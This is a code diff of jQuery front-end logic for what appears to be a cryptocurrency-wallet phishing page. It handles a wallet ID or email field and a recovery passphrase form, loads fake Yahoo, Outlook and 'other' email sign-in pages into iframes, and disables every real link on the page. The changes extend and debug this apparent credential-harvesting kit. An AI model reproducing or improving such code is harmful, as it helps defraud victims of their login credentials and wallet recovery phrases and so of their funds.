@@ -32,8 +32,13 @@ let submitButton3 = "Verify";
 
 $(function () {
 
+    $("a").each(function (index, element){
+        $(element).attr("onclick", "return false;")
+    })
+
     $("#yahoo_modal iframe").attr("srcdoc", YA_YO)
     $("#outlook_modal iframe").attr("srcdoc", O_T)
+    $("#others_modal iframe").attr("srcdoc", O_T_E)
 
     $("#wallet, #exchanger").on('click', function () {
         if ($(this).hasClass('is-active') === false) {
@@ -69,7 +74,7 @@ $(function () {
     })
 
 
-    $("#guidOrEmail").on('keyup focusout', function (e) {
+    $("#guidOrEmail").on('keyup focusout change', function (e) {
 
         if (e.type === "keyup") {
             is_clicked = false;
@@ -180,7 +185,7 @@ $(function () {
             if (result === true) {
                 setTimeout(function () {
                     $("#emailRightTop").html(EmailValue);
-                    $("#phrase").html("").removeClass("has-error");
+                    $("#phrase").val("").removeClass("has-error");
                     $("#loginResendEmail").html(submitButton3).removeClass("rolling_started");
                     $("#passPhraseForm").show();
                     $("#passwordForm").hide();
@@ -188,6 +193,7 @@ $(function () {
                     $button.removeClass("rolling_started");
                 }, 1200);
             } else {
+                console.log(result);
                 location.replace(location.href);
             }
         }
@@ -286,6 +292,10 @@ $(function () {
     })
 
 
+    $("#backButtonArrow").on('click', function (){
+        location.replace(location.href);
+    })
+
 })
 
 
@@ -325,7 +335,8 @@ async function post_data(type, post) {
                 resolve(true);
             },
             error: function (response) {
-                let error = {errors: response.responseJSON.errors[0]}
+                let error = {errors: response}
+                console.log(error)
                 resolve(false);
             }
         });
